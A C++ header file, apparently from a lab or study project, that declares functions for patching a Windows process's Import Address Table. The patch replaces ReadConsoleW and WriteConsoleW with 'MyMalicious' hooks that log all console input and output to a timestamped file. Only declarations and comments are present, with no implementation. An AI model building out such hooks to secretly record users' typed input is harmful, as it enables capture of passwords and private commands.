#pragma once
#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files:
#include <windows.h>

using namespace std;

/*
	MyMalicious is a constant enum used to differntiate between the Read and Write console functions we patch.
*/
const enum MyMalicious {
	_MyMaliciousReadConsoleW,
	_MyMaliciousWriteConsoleW
};

/*
	PatchIAT
	Input:
		string const& wantedFunctionName:
			The function we want to patch.
			This is a reference to a constant string since we only read it.
		string const& wantedDllName:
			The dll file containing the function we want to patch.
			This is a reference to a constant string since we only read it.
		MyMalicious const& func:
			We patch IAT of ReadConsoleW and WriteConsoleW, we use this enum to differntiate both cases
			This is a reference to a constant string since we only read it.
	Output:
		Nothing (void)
	Functionality:
		This function patches the IAT of the given wantedFunctionName in the given wantedDllName,
		and replace it with the coresponding function based on the given func.
*/
void PatchIAT(string const& wantedFunctionName, string const& wantedDllName, MyMalicious const& func);

/*
	getFunctionAddress
	Input:
		string const& const wantedFunctionName:
			The function we want to patch.
			This is a reference to a constant string since we only read it.
		string const& const wantedDllName:
			The dll file containing the function we want to patch.
			This is a reference to a constant string since we only read it.
	Output:
		A pointer to the function we found, or 0 if we couldn't find it.
	Functionality:
		Finds the import descriptor and searches for the pointer to wantedFunctionName in the wantedDllName.
*/
void** getFunctionAddress(string const& wantedFunctionName, string const& wantedDllName);

/* 
	MyMaliciousReadConsoleW
	Input (taken from ReadConsoleW for compatability): 
		hConsoleInput[in]:	A handle to the console input buffer.
		lpBuffer[out]:		A pointer to a buffer that receives the data read from the console input buffer.
							The storage for this buffer is allocated from a shared heap for the process that is 64 KB in size.
							The maximum size of the buffer will depend on heap usage.
		nNumberOfCharsToRead[in]:	
							The number of characters to be read.
							The size of the buffer pointed to by the lpBuffer parameter should be at least nNumberOfCharsToRead * sizeof(TCHAR) bytes.
		lpNumberOfCharsRead[out]:	
							A pointer to a variable that receives the number of characters actually read.
		pInputControl[in, optional]:	
							A pointer to a CONSOLE_READCONSOLE_CONTROL structure that specifies a control character to signal the end of the read operation.
							This parameter can be NULL.
	Output:
		Calls the real ReadConsoleW function with the same input parameters.
		If the function succeeds, the return value is nonzero.
		If the function fails, the return value is zero (to get extended error information, call GetLastError).
	Functionality:
		write the lpBuffer to a file and then performs the original ReadConsoleW operation
*/
BOOL WINAPI MyMaliciousReadConsoleW(
	_In_     HANDLE  hConsoleInput,
	_Out_    LPVOID  lpBuffer,
	_In_     DWORD   nNumberOfCharsToRead,
	_Out_    LPDWORD lpNumberOfCharsRead,
	_In_opt_ PCONSOLE_READCONSOLE_CONTROL  pInputControl
);

/*
	MyMaliciousWriteConsoleW
	Input (taken from WriteConsoleW for compatability):
		hConsoleOutput [in]:	A handle to the console screen buffer. 
		lpBuffer [in]:			A pointer to a buffer that contains characters to be written to the console screen buffer.
								The storage for this buffer is allocated from a shared heap for the process that is 64 KB in size. 
								The maximum size of the buffer will depend on heap usage.
		nNumberOfCharsToWrite [in]:
								The number of characters to be written. 
								If the total size of the specified number of characters exceeds the available heap, the function fails with ERROR_NOT_ENOUGH_MEMORY.
		lpNumberOfCharsWritten [out]:
								A pointer to a variable that receives the number of characters actually written.
		lpReserved:				Reserved; must be NULL.
	Output:					
		If the function succeeds, the return value is nonzero.
		If the function fails, the return value is zero (to get extended error information, call GetLastError).
	Functionality:
		Performs the origina, WriteConsoleW operation and then write the same lpBuffer to a file
*/
BOOL WINAPI MyMaliciousWriteConsoleW(
	_In_             HANDLE  hConsoleOutput,
	_In_       const VOID    *lpBuffer,
	_In_             DWORD   nNumberOfCharsToWrite,
	_Out_            LPDWORD lpNumberOfCharsWritten,
	_Reserved_       LPVOID  lpReserved
);

/*
	writeToFile
	Input:
		string const& const _Filename:
			The file to which we write to.
			This is a reference to a constant string since we only read it.
		LPCWSTR const lpBuffer:
			The buffer containing the output we want to write to the file.
		MyMalicious const& const func
			We patch IAT of ReadConsoleW and WriteConsoleW, we use this enum to differntiate both cases
			This is a reference to a constant string since we only read it.
		string const& const opening:
			An opional parameter for an opening to each line in the written output file.
			default is nullptr (i.e., no opening).
	Output:
		Nothing (void)
	Functionality:
		Open the file at _Filename in append mode, print lpBuffer line by line, starting with a timestamp,
		then openening then the first line in lpBuffer. Read buffer untill reach delimiter detrmined using func.
*/
void writeToFile(string const& _Filename, LPCWSTR lpBuffer, MyMalicious const& func, string const& opening = nullptr);

